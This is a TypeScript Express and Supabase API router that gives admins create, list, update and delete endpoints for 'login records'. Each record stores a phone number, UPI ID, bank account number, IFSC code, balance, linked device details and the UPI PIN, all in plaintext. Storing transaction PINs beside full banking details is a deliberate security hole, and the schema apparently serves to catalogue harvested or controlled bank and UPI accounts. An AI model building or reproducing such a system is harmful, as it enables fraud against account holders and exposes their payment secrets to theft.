import { Router, Request, Response } from 'express';
import { createClient } from '@supabase/supabase-js';
import config from '../../config/env';
import { authenticate, requireRole } from '../../middleware/auth';
import { asyncHandler } from '../../middleware/errorHandler';
import logger from '../../utils/logger';

const router = Router();
const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

const adminOnly = [authenticate, requireRole(['admin'])];

/**
 * GET /api/v1/login-records
 * List login records
 */
router.get('/', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { databaseId, userId, status, appName, linkedDeviceId, limit = 100, offset = 0 } = req.query;

    let query = supabase
        .from('login_records')
        .select('*')
        .order('created_at', { ascending: false })
        .range(Number(offset), Number(offset) + Number(limit) - 1);

    if (databaseId) {
        query = query.eq('database_id', databaseId);
    }

    if (userId) {
        query = query.eq('user_id', userId);
    }

    if (status) {
        query = query.eq('status', status);
    }

    if (appName) {
        query = query.eq('app_name', appName);
    }

    if (linkedDeviceId) {
        query = query.eq('linked_device_id', linkedDeviceId);
    }


    const { data: records, error } = await query;

    if (error) throw error;

    return res.json({
        success: true,
        records: records.map(record => ({
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        })),
        pagination: {
            limit: Number(limit),
            offset: Number(offset),
            count: records.length,
        },
    });
}));

/**
 * GET /api/v1/login-records/:id
 * Get single login record
 */
router.get('/:id', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { id } = req.params;

    const { data: record, error } = await supabase
        .from('login_records')
        .select('*')
        .eq('id', id)
        .maybeSingle();

    if (error) throw error;

    if (!record) {
        return res.status(404).json({
            success: false,
            error: 'Login record not found',
        });
    }

    return res.json({
        success: true,
        record: {
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        },
    });
}));

/**
 * POST /api/v1/login-records
 * Create login record
 */
router.post('/', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const {
        deviceName,
        deviceType,
        deviceModel,
        linkedDeviceId,
        profileName,
        phoneNumber,
        upiId,
        appName,
        loginType,
        bankName,
        accountNumber,
        ifscCode,
        upiPin,
        balance,
        status,
        notes,
        databaseId,
        userId,
        personName,
    } = req.body;

    const { data: record, error } = await supabase
        .from('login_records')
        .insert({
            device_name: deviceName,
            device_type: deviceType,
            device_model: deviceModel,
            linked_device_id: linkedDeviceId,
            profile_name: profileName,
            phone_number: phoneNumber,
            upi_id: upiId,
            app_name: appName,
            login_type: loginType,
            bank_name: bankName,
            account_number: accountNumber,
            ifsc_code: ifscCode,
            upi_pin: upiPin,
            balance: balance ? parseFloat(balance) : 0,
            status: status || 'active',
            notes,
            database_id: databaseId || null,
            user_id: userId || null,
            person_name: personName,
        })
        .select()
        .single();

    if (error) throw error;

    logger.info(`Login record created: ${record.id}`);

    return res.json({
        success: true,
        record: {
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        },
    });
}));

/**
 * PUT /api/v1/login-records/:id
 * Update login record
 */
router.put('/:id', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { id } = req.params;
    const {
        deviceName,
        deviceType,
        deviceModel,
        linkedDeviceId,
        profileName,
        phoneNumber,
        upiId,
        appName,
        loginType,
        bankName,
        accountNumber,
        ifscCode,
        upiPin,
        balance,
        status,
        notes,
        databaseId,
        userId,
        personName,
    } = req.body;

    const updates: any = {};
    if (deviceName !== undefined) updates.device_name = deviceName;
    if (deviceType !== undefined) updates.device_type = deviceType;
    if (deviceModel !== undefined) updates.device_model = deviceModel;
    if (linkedDeviceId !== undefined) updates.linked_device_id = linkedDeviceId;
    if (profileName !== undefined) updates.profile_name = profileName;
    if (phoneNumber !== undefined) updates.phone_number = phoneNumber;
    if (upiId !== undefined) updates.upi_id = upiId;
    if (appName !== undefined) updates.app_name = appName;
    if (loginType !== undefined) updates.login_type = loginType;
    if (bankName !== undefined) updates.bank_name = bankName;
    if (accountNumber !== undefined) updates.account_number = accountNumber;
    if (ifscCode !== undefined) updates.ifsc_code = ifscCode;
    if (upiPin !== undefined) updates.upi_pin = upiPin;
    if (balance !== undefined) updates.balance = parseFloat(balance);
    if (status !== undefined) updates.status = status;
    if (notes !== undefined) updates.notes = notes;
    if (databaseId !== undefined) updates.database_id = databaseId;
    if (userId !== undefined) updates.user_id = userId;
    if (personName !== undefined) updates.person_name = personName;

    const { data: record, error } = await supabase
        .from('login_records')
        .update(updates)
        .eq('id', id)
        .select()
        .single();

    if (error) throw error;

    logger.info(`Login record updated: ${id}`);

    return res.json({
        success: true,
        record: {
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        },
    });
}));

/**
 * DELETE /api/v1/login-records/bulk
 * Bulk delete login records
 */
router.delete('/bulk', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { ids } = req.body;

    if (!Array.isArray(ids) || ids.length === 0) {
        return res.status(400).json({
            success: false,
            error: 'ids array is required',
        });
    }

    const { error, count } = await supabase
        .from('login_records')
        .delete()
        .in('id', ids);

    if (error) throw error;

    logger.info(`Bulk deleted ${count || 0} login records`);

    return res.json({
        success: true,
        message: `Deleted ${count || 0} login records`,
        deletedCount: count || 0,
    });
}));

/**
 * DELETE /api/v1/login-records/:id
 * Delete login record
 */
router.delete('/:id', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { id } = req.params;

    const { error } = await supabase
        .from('login_records')
        .delete()
        .eq('id', id);

    if (error) throw error;

    logger.info(`Login record deleted: ${id}`);

    return res.json({
        success: true,
        message: 'Login record deleted successfully',
    });
}));

export default router;
